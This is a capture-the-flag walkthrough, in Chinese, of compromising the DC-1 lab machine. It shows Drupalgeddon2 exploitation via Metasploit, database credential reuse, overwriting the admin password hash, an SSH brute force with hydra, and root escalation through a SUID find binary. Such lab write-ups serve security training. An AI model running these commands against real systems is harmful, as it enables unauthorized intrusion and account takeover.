## DC-1靶场

kali：192.168.119.131

靶机：192.168.119.134

### 1.信息收集

（1）arp-scan -l

![image-20220930220432755](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202209302204784.png)

（2）netdiscover发现主机（比较慢，不推荐）

![image-20220930220254993](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202209302203188.png)

nmap扫描

```
使用命令：nmap -sS -sV -A -n 192.168.119.134
```

![image-20220930222209250](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202209302222308.png)

由nmap扫描可以知道，目标靶机开放了22,80,111,42875端口，看到端口号22想到[ssh](https://so.csdn.net/so/search?q=ssh&spm=1001.2101.3001.7020)远程连接，端口号80想到web网页攻击。后面两个端口暂时想不到有什么用，所以先放在一般后面可能会用到。所以直接访问网页。

![image-20220930224827607](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202209302248703.png)

先访问一下80端口，发现一个CMS，下标有个Drupal

### 2.漏洞发现

首先要了解一下``Drupal``，Drupal是开源CMS之一，Drupal是CMS内容管理系统，并且在世界各地使用，受到高度赞赏，Drupal可以作为开源软件免费使用，就是附带了cms的php开发框架。

搜了一下相关的drupal 漏洞 打开msf 看一下有哪些具体的模块可以使用`` exploit/unix/webapp/drupal_drupalgeddon2``

![image-20221001001513281](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210010015326.png)



```
Name:漏洞名称
Disclosure Date：漏洞披露日期
Rank:漏洞等级，等级越高，利用效果越好
Check:
Description:漏洞描述信息
```

![image-20221001002733754](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210010027786.png)

```
//使用模块
use exploit/unix/webapp/drupal_drupalgeddon2
//设置攻击ip
set rhost 192.168.119.134
//运行
exploit
```

### 3.漏洞利用

连接上后，进入后渗透模块

![image-20221001004221080](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210010042122.png)

```
shell:获得网站后台权限
ls:列举目录
发现flag1.txt
cat flag1.txt查看内容 
```

flag1中提示到：``Every good CMS needs a config file - and so do you`` 

简单翻译一下就是：每个好的cms都需要一个配置文件，你也是！ 

每个网站的配置文件的位置不同，有时候需要经验，有时候很明显

这里是``/sites/default/settings.php``

![image-20221001005039782](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210010050842.png)



```
配置文件中，很明显可以找到flag2的内容：
Brute force and dictionary attacks aren't the only ways to gain acess (and you WILL need access).
What can you do with these credentitals?

暴力和字典攻击并不是获得访问权限的唯一方法（您需要访问权限）。
你能用这些凭证做什么？
```

继续往下看配置文件，我们可以看到一些数据库的信息

使用`netstat -anptl`查看3306是否开放，结果只允许本地连接

![image-20221001005920025](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210010059066.png)

写一个python交互：`python -c "import pty;pty.spawn('/bin/bash')"` 

```
  python -c "import pty;pty.spawn('/bin/bash')"
```

![image-20221001010357593](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210010103618.png)

登入数据库 `mysql -u dbuser -p R0ck3t` 即可。

![image-20221001010524012](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210010105048.png)

```
show databases; //查看数据库
use drupaldb;  //使用drupaldb数据库
show tables;  //查看表
```

![image-20221001092022906](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210010920077.png)

拿到数据库权限，我们就可以对数据库进行操作。比如更改网站后台密码，登录网站。

我们要找到管理员用户，一般先看user表``select * from users;``

![image-20221001092413844](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210010924896.png)

```
|   1 | admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR | admin@example.com | 
```

很明显，密码被加密了，因为hash值解密比较困难，所以我们要改它的密码，也要进行同样加密。

![image-20221001093029471](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210010930506.png)

继续在网站的目录中找线索，``/var/www``文件夹下有一个``scripts``文件夹，打开查看到``password-hash.sh``

```
php scripts/password-hash.sh password
password: password              
hash:$S$DOAhrLBjPOqUqWJJz6pPrPnunYisL8PX.CHbWEqf9ZT8kAhw0yUP

password: luminary              
hash:$S$DfzVUzddHY8MWEz2e05xxB6NJRgKTXmqgBPi0Z04/K68lIkxGdX1

```

![image-20221001093807185](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210010938211.png)

使用``password-hash.sh``文件生成自己的密码hash值替换数据库的hash，然后我们就能用自己的密码登录后台

```
update drupaldb.users set pass="$S$DYyHOGvUlVey/TRbXOU7.Gsp2wKX.9Q9Jt/SFd085Xhq.cAR.S0u" where name="admin"; ##修改密码
```

![image-20221001094156647](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210010941679.png)

```
http://192.168.119.134/node/2#overlay-context=node/
```

![image-20221001095058920](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210010950966.png)

```
Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.
```

这里给的提示是让我们去看passwd和shadow，稍微懂一点linux都知道它们是linux文件

```
/etc/passwd
该文件存储了系统用户的基本信息，所有用户都可以对其进行文件操作读
/etc/shadow
该文件存储了系统用户的密码等信息，只有root权限用户才能读取
```

[Linux /etc/passwd内容解释（超详细）](http://c.biancheng.net/view/839.html)

[Linux /etc/shadow（影子文件）内容解析（超详细）](http://c.biancheng.net/view/840.html)

还提示到``perms、find、-exec``关键词

### 4.SUID提权

`cat /etc/passwd` 发现了一个用户 `flag4`

![image-20221001100310739](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210011003787.png)

找到flag4所在文件

![image-20221001100641721](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210011006752.png)

```
Can you use this same method to find or access the flag in root?Probably. But perhaps it's not that easy.  Or maybe it is?
你能用同样的方法来查找或访问根目录中的标志吗？可能但也许这并不容易。或者可能是这样？
```

继续，查看/etc/shadow，但权限不够

![image-20221001100931797](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210011009824.png)

使用find命令查找有特殊权限`suid`的命令：`find / -perm -4000`

![](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210011013758.png)

### 5.获取flag

使用find命令提权

```
find ./ aaa -exec '/bin/sh' \;
```

![image-20221001101452655](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210011014690.png)



参考网上的博客后，还学习到一种思路。

目标靶机用户`flag4`,并且有`/bin/bash`，看到这想到了还有端口22，所以ssh连接。但是密码不知道所以只能用爆破神器`hydra`

用kali自带密码字典，路径为``/usr/share/john/password.lst``,kali自带各种密码默认保存在``/usr/share/``下。

```
hydra -l flag4 -P /usr/share/john/password.lst 192.168.119.134 ssh -vV -f 

其中-l表示指定爆破的用户，-P表示指定使用哪个密码字典，ip为DC1的ip，利用ssh协议做爆破
```

![image-20221001104351971](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210011043002.png)

![image-20221001104428397](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210011044427.png)

爆破得到，DC1的一个用户名密码为：flag4/orange， 所以我们新打开一个终端，采用ssh协议直接连接

```
ssh flag4@192.168.119.134
```

![image-20221001104625672](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210011046708.png)

输入密码，连接成功！

根据flag4的提示，是要我们拿到root用户权限，才能拿到最终的flag

```
find / -perm -4000 2>/dev/null
```

![image-20221001105135889](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210011051927.png)

 发现_find_具有root权限。直接执行命令提权。

```bash
find -exec /bin/sh \;
```

![image-20221001105305625](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210011053652.png)

liunx提权一般有四种提权方式：

```
sudo提权，通过命令sudo -l查看是否有可提权的命令。
suid提权，通过命令find / -perm -4000 2>/dev/null查看是否具有root权限的命令
系统版本内核提权
通过数据库提权
```

